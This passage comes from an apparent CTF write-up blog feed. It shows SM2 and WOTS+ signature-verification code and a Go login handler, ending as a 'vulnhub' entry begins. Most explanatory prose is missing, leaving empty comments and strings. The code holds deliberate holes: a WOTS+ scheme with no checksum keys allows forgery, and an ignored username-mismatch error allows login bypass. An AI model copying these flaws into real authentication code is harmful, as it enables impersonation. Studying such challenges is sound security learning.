<span class="built_in">len</span>(asn1_acess) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;asn1&quot;</span>)</span><br><span class="line">        cert_hex = self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;certificate&#x27;</span>])</span><br><span class="line">        sm2_cert_verifier = Sm2CertVerifier(cert_hex)</span><br><span class="line">        valid = sm2_cert_verifier.verify()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        g = self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;basePoint&#x27;</span>])</span><br><span class="line">        g = g[<span class="number">2</span>:] <span class="keyword">if</span> g.startswith(<span class="string">&quot;04&quot;</span>) <span class="keyword">else</span> g</span><br><span class="line">        self.ecc_table = &#123;</span><br><span class="line">            <span class="string">&#x27;n&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;p&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;fieldParameters&#x27;</span>][<span class="string">&#x27;prime&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;g&#x27;</span>: g,</span><br><span class="line">            <span class="string">&#x27;a&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;curveParameters&#x27;</span>][<span class="string">&#x27;coefficientA&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;b&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;curveParameters&#x27;</span>][<span class="string">&#x27;coefficientB&#x27;</span>]),</span><br><span class="line">        &#125;</span><br><span class="line">        public_key = self.extract_public_key(sm2_cert_verifier.cert_tbs)</span><br><span class="line">        self.sm2_crypt = CryptSM2(</span><br><span class="line">            private_key=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            public_key=public_key,</span><br><span class="line">            ecc_table=self.ecc_table</span><br><span class="line">        )</span><br><span class="line">        self.sign = (<span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;sm2Signature&#x27;</span>][<span class="string">&#x27;r&#x27;</span>]).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().upper() +</span><br><span class="line">                     <span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;sm2Signature&#x27;</span>][<span class="string">&#x27;s&#x27;</span>]).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().upper())</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hex_to_asn1</span>(<span class="params">hex_str, asn1_spec</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        16ASN.1</span></span><br><span class="line"><span class="string">        :param hex_str: 16</span></span><br><span class="line"><span class="string">        :param asn1_spec: ASN.1</span></span><br><span class="line"><span class="string">        :return: ASN.1</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 16</span></span><br><span class="line">        der_bytes = binascii.unhexlify(hex_str)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ASN.1</span></span><br><span class="line">        asn1_object, excess = decode(der_bytes, asn1Spec=asn1_spec)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> asn1_object,excess</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_hex_value</span>(<span class="params">value</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; ASN.1  16 &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, univ.Integer):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">format</span>(<span class="built_in">int</span>(value), <span class="string">&#x27;X&#x27;</span>)  <span class="comment"># Integer -&gt; </span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, univ.OctetString):</span><br><span class="line">            <span class="keyword">return</span> value.asOctets().<span class="built_in">hex</span>().upper()  <span class="comment"># OctetString -&gt; </span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unsupported type: <span class="subst">&#123;<span class="built_in">type</span>(value)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_public_key</span>(<span class="params">tbs</span>):</span><br><span class="line">        spki = tbs.getComponentByName(<span class="string">&#x27;subjectPublicKeyInfo&#x27;</span>)</span><br><span class="line">        public_key_bitstring = spki.getComponentByName(<span class="string">&#x27;subjectPublicKey&#x27;</span>)</span><br><span class="line">        <span class="comment">#  0x04</span></span><br><span class="line">        pubkey_bytes = <span class="built_in">bytearray</span>(public_key_bitstring.asOctets())</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="keyword">return</span> pubkey_bytes.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_misc</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;version&#x27;</span>]) != <span class="number">1</span> <span class="keyword">or</span></span><br><span class="line">                <span class="built_in">str</span>(self.sm2_signed_data[<span class="string">&#x27;digestAlgorithms&#x27;</span>]) != <span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span> <span class="keyword">or</span></span><br><span class="line">                <span class="built_in">str</span>(self.sm2_signed_data[<span class="string">&#x27;timestamp&#x27;</span>]) != <span class="string">&quot;20250520101000Z&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, data</span>):</span><br><span class="line">        valid = self.verify_misc()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">            <span class="keyword">return</span> valid</span><br><span class="line">        valid = self.sm2_crypt.verify_with_sm3(self.sign, data)</span><br><span class="line">        <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># SM2SignedData</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateSM2SignedDataExample</span>():</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    version = <span class="number">1</span></span><br><span class="line">    <span class="comment"># oid</span></span><br><span class="line">    oid = <span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span></span><br><span class="line">    <span class="comment"># r, s</span></span><br><span class="line">    signature = <span class="string">&#x27;6f8eaff551d0f3fa6de74b75b33e1e58f9fdb4dc58e61c82e11e717ffcf168c4db3d5a90ff3625d12b8b658f8dbab34340c278b412b3aff25489e7feb1c75598&#x27;</span></span><br><span class="line">    r = signature[:<span class="number">64</span>]</span><br><span class="line">    s = signature[<span class="number">64</span>:]</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    curve_params = &#123;</span><br><span class="line">        <span class="string">&quot;n&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;g&quot;</span>: <span class="string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;b&quot;</span>: <span class="string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    cert_hex = <span class="string">&#x27;3082017C30820122A003020102020D00947C8427D3E849B48A7E5136300A06082A811CCF550183753036310B300906035504061302434E31133011060355040A130A5368616E674D6942656931123010060355040313095368616E674D694341301E170D3235303532303035353330365A170D3330303531393035353330365A304D310B300906035504061302434E3110300E060355040A1307496E746572434131173015060355040B130E5368616E674D6942656932303235311330110603550403130A7368616E676D696265693059301306072A8648CE3D020106082A811CCF5501822D03420004CECC0005AED684A1E7E39C316E7F3F39BDD0490936BC0E1AFDDC1B9627A05B4418809E5327746EE1977913F036EF0A9A255C27D73C00E45D0BB205B34D2C80D4300A06082A811CCF5501837503480030450220360779CBF5AA6E5E9CC073D95E22C52C09E81CFC06A3916559063A3C8C1DFDE6022100ED0E5E5E51F3894A3EAC11F247739D9F6A88C961D89F68337972BC3CC6BB6706&#x27;</span>  <span class="comment"># 16</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    time_stamp = <span class="string">&#x27;2025-05-20 10:10:00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># asn1</span></span><br><span class="line">    asn1_package_hex = asn1_package(version, oid, signature, curve_params, cert_hex, time_stamp)</span><br><span class="line">    <span class="keyword">return</span>(asn1_package_hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    data = <span class="string">b&quot;Hello, CryptoCup!&quot;</span></span><br><span class="line">    asn1_package_hex = generateSM2SignedDataExample()</span><br><span class="line">    sm2_config = SM2Config(asn1_package_hex)</span><br><span class="line">    result = sm2_config.verify(data)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">308202CD02010106092A811CCF5501831101304502206F8EAFF551D0F3FA6DE74B75B33E1E58F9FDB4DC58E61C82E11E717FFCF168C4022100DB3D5A90FF3625D12B8B658F8DBAB34340C278B412B3AFF25489E7FEB1C755983081E0020101302C06072A8648CE3D0101022100FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF30440420FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC042028E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E9304410432C4AE2C1F1981195F9904466A39C9948FE30BBFF2660BE1715A4589334C74C7BC3736A2F4F6779C59BDCEE36B692153D0A9877CC62A474002DF32E52139F0A0022100FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123020101048201803082017C30820122A003020102020D00947C8427D3E849B48A7E5136300A06082A811CCF550183753036310B300906035504061302434E31133011060355040A130A5368616E674D6942656931123010060355040313095368616E674D694341301E170D3235303532303035353330365A170D3330303531393035353330365A304D310B300906035504061302434E3110300E060355040A1307496E746572434131173015060355040B130E5368616E674D6942656932303235311330110603550403130A7368616E676D696265693059301306072A8648CE3D020106082A811CCF5501822D03420004CECC0005AED684A1E7E39C316E7F3F39BDD0490936BC0E1AFDDC1B9627A05B4418809E5327746EE1977913F036EF0A9A255C27D73C00E45D0BB205B34D2C80D4300A06082A811CCF5501837503480030450220360779CBF5AA6E5E9CC073D95E22C52C09E81CFC06A3916559063A3C8C1DFDE6022100ED0E5E5E51F3894A3EAC11F247739D9F6A88C961D89F68337972BC3CC6BB6706180F32303235303532303130313030305A</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">():</span></span><br><span class="line"><span class="string">TYTNGLNVKYDLVCGTUYUARFLEFKLAKAZO</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3"><a class="markdownIt-Anchor" href="#3"></a> 3</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Callable</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_32byte_chunks</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 6432 = 64</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;64&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 64</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">bytes</span>.fromhex(hex_str[i:i + <span class="number">64</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openssl_sha256</span>(<span class="params">message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> sha256(message).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WOTSPLUS</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        w: <span class="built_in">int</span> = <span class="number">16</span>,  <span class="comment"># Winternitz </span></span></span><br><span class="line"><span class="params">        hashfunction: <span class="type">Callable</span> = openssl_sha256,  <span class="comment"># </span></span></span><br><span class="line"><span class="params">        digestsize: <span class="built_in">int</span> = <span class="number">256</span>,  <span class="comment"># </span></span></span><br><span class="line"><span class="params">        pubkey: <span class="type">List</span>[<span class="built_in">bytes</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.w = w</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">2</span> &lt;= w &lt;= (<span class="number">1</span> &lt;&lt; digestsize)):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;:2 &lt;= w &lt;= 2^digestsize&quot;</span>)</span><br><span class="line">        <span class="comment"># 8</span></span><br><span class="line">        self.msg_key_count = <span class="number">8</span></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        self.cs_key_count = <span class="number">0</span></span><br><span class="line">        <span class="comment">#  =  + </span></span><br><span class="line">        self.key_count = self.msg_key_count + self.cs_key_count</span><br><span class="line">        self.hashfunction = hashfunction</span><br><span class="line">        self.digestsize = digestsize</span><br><span class="line">        self.pubkey = pubkey</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">number_to_base</span>(<span class="params">num: <span class="built_in">int</span>, base: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> [<span class="number">0</span>]  <span class="comment">#  0 0</span></span><br><span class="line"></span><br><span class="line">        digits = []  <span class="comment"># </span></span><br><span class="line">        <span class="keyword">while</span> num:</span><br><span class="line">            digits.append(<span class="built_in">int</span>(num % base))  <span class="comment"># </span></span><br><span class="line">            num //= base  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> digits[::-<span class="number">1</span>]  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_chain</span>(<span class="params">self, value: <span class="built_in">bytes</span>, startidx: <span class="built_in">int</span>, endidx: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startidx, endidx):</span><br><span class="line">            value = self.hashfunction(value)  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_signature_base_message</span>(<span class="params">self, msghash: <span class="built_in">bytes</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        msgnum = <span class="built_in">int</span>.from_bytes(msghash, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        msg_to_sign = self.number_to_base(msgnum, self.w)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(msg_to_sign) &gt; self.msg_key_count:</span><br><span class="line">            err = (</span><br><span class="line">                <span class="string">&quot;The fingerprint of the message could not be split into the&quot;</span></span><br><span class="line">                + <span class="string">&quot; expected amount of bitgroups. This is most likely &quot;</span></span><br><span class="line">                + <span class="string">&quot;because the digestsize specified does not match to the &quot;</span></span><br><span class="line">                + <span class="string">&quot; real digestsize of the specified hashfunction Excepted:&quot;</span></span><br><span class="line">                + <span class="string">&quot; &#123;&#125; bitgroups\nGot: &#123;&#125; bitgroups&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">raise</span> IndexError(err.<span class="built_in">format</span>(self.msg_key_count, <span class="built_in">len</span>(msg_to_sign)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> msg_to_sign</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_pubkey_from_signature</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self, digest: <span class="built_in">bytes</span>, signature: <span class="type">List</span>[<span class="built_in">bytes</span>]</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="type">List</span>[<span class="built_in">bytes</span>]:</span><br><span class="line">        msg_to_verify = self.get_signature_base_message(digest)</span><br><span class="line"></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg_to_verify):</span><br><span class="line">            sig_part = signature[idx]</span><br><span class="line">            chained_val = self._chain(sig_part, val, self.w - <span class="number">1</span>)</span><br><span class="line">            result.append(chained_val)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, digest: <span class="built_in">bytes</span>, signature: <span class="type">List</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        pubkey = self.get_pubkey_from_signature(digest, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> pubkey == self.pubkey <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pubkey_hex = <span class="string">&quot;5057432973dc856a7a00272d83ea1c14de52b5eb3ba8b70b373db8204eb2f902450e38dbade5e9b8c2c3f8258edc4b7e8101e94ac86e4b3cba92ddf3d5de2a2b454c067a995060d1664669b45974b15b3423cec342024fe9ccd4936670ec3abaae4f6b97279bd8eb26463a8cb3112e6dcbf6301e4142b9cdc4adfb644c7b114af4f0cf8f80e22c3975ba477dc4769c3ef67ffdf2090735d81d07bc2e6235af1ee41ef332215422d31208c2bc2163d6690bd32f4926b2858ca41c12eec88c0a300571901a3f674288e4a623220fb6b70e558d9819d2f23da6d897278f4056c346d7f729f5f70805ad4e5bd25cfa502c0625ac02185e014cf36db4ebcdb3ed1a38&quot;</span></span><br><span class="line">    pubkey_list_bytes = hex_to_32byte_chunks(pubkey_hex)</span><br><span class="line">    wots = WOTSPLUS(pubkey=pubkey_list_bytes)</span><br><span class="line">    digest_hex = <span class="string">&quot;84ffb82e&quot;</span></span><br><span class="line">    signature_hex = <span class="string">&quot;25d5a0e650d683506bfe9d2eca6a3a99b547a4b99398622f6666ce10131e971b6bd36841c9074fe9b4de2900ebe3fadb3202a173be486da6cf8f3d8c699c95c3454c067a995060d1664669b45974b15b3423cec342024fe9ccd4936670ec3abaae4f6b97279bd8eb26463a8cb3112e6dcbf6301e4142b9cdc4adfb644c7b114a4966398a789b56bdb09ea195925e7e8cde372305d244604c48db08f08a6e8a38951030deb25a7aaf1c07152a302ebc07d5d0893b5e9a5953f3b8500179d138b9aa90c0aaacea0c23d22a25a86c0b747c561b480175b548fcb1f4ad1153413bc74d9c049d43ffe18ceee31e5be8bdb9968103ef32fb4054a4a23c400bbfe0d89f&quot;</span></span><br><span class="line">    digest_bytes = <span class="built_in">bytes</span>.fromhex(digest_hex)</span><br><span class="line">    signature = hex_to_32byte_chunks(signature_hex)</span><br><span class="line">    valid = wots.verify(digest_bytes, signature)</span><br><span class="line">    <span class="built_in">print</span>(valid)</span><br></pre></td></tr></table></figure><p><code>signature_hex</code><code>hex_to_32byte_chunks</code><br /><strong></strong><strong>sha256</strong><code>8xxxx</code>7<code>w-1=15</code> <code>[8:15)</code>7<br /><code>pubkey</code><br /><code>verify</code><code>pubkey</code><code>pubkey</code></p><p><code>get_pubkey_from_signature</code><code>ffffffff</code></p><p><img src="https://pica.zhimg.com/80/v2-a41a5389e5d7b44b7ffd5fb5f733c5b8_1440w.png" alt="" /><br /><strong>751</strong>5<br />O^O</p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> *</h2><h3 id="gitea"><a class="markdownIt-Anchor" href="#gitea"></a> gitea*</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># login.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> service</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/asn1&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/tjfoc/gmsm/sm2&quot;</span></span><br><span class="line"><span class="string">&quot;math/big&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *LoginService)</span></span> Login(username, authInfo, certStr <span class="type">string</span>) (token <span class="type">string</span>, err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">cert, err := s.CertService.LoadCertificate(certStr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := s.CertService.ValidateCertificate(cert, RootCert); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">if</span> cert.Subject.CommonName != username &#123;</span><br><span class="line">err = errors.New(<span class="string">&quot;username is not valid&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">ecdsaPubKey, ok := cert.PublicKey.(*ecdsa.PublicKey)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;public key in cert is not sm2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">sm2PubKey := sm2.PublicKey&#123;</span><br><span class="line">Curve: ecdsaPubKey.Curve,</span><br><span class="line">X:     ecdsaPubKey.X,</span><br><span class="line">Y:     ecdsaPubKey.Y,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  authInfo  randomStr  signature</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(authInfo) != <span class="number">256</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">randomStr := authInfo[<span class="number">0</span>:<span class="number">128</span>]</span><br><span class="line">signature := authInfo[<span class="number">128</span>:]</span><br><span class="line"></span><br><span class="line">_, err = ValidateSignature(randomStr, signature, &amp;sm2PubKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s.generateToken(username)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ValidateSignature</span><span class="params">(messageHex, signatureHex <span class="type">string</span>, publicKey *sm2.PublicKey)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line">msg, err := hex.DecodeString(messageHex)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(signatureHex) != <span class="number">128</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r, ok := big.NewInt(<span class="number">0</span>).SetString(signatureHex[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">s, ok := big.NewInt(<span class="number">0</span>).SetString(signatureHex[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature, err := asn1.Marshal(<span class="keyword">struct</span>&#123; R, S *big.Int &#125;&#123;r, s&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isValid := publicKey.Verify(msg, signature)</span><br><span class="line"><span class="keyword">if</span> isValid &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, fmt.Errorf(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong></strong><strong></strong></p><p></p><p></p><p><img src="https://pic1.zhimg.com/80/v2-710631aedf0c58eeaa7b2a39dc32a476_1440w.jpeg" alt="" /><br /><img src="https://pica.zhimg.com/80/v2-5801c0b799379099e611b0c67ab82a82_1440w.jpeg" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-3d1106abce12b0a535eef9715fafc69d_1440w.jpeg" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-f54fc52f21112d13bf90e2711faa78d0_1440w.jpeg" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-d7b80113ecfd9a518e75b475c7bf7137_1440w.jpeg" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;(bushi)&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub</title>
    <link href="https://hvang10.github.io/2025/06/06/vulnhub%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/06/06/vulnhub%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
    <published>2025-06-05T17:39:43.000Z</published>
    <updated>2025-08-05T17:48:07.498Z</updated>
    
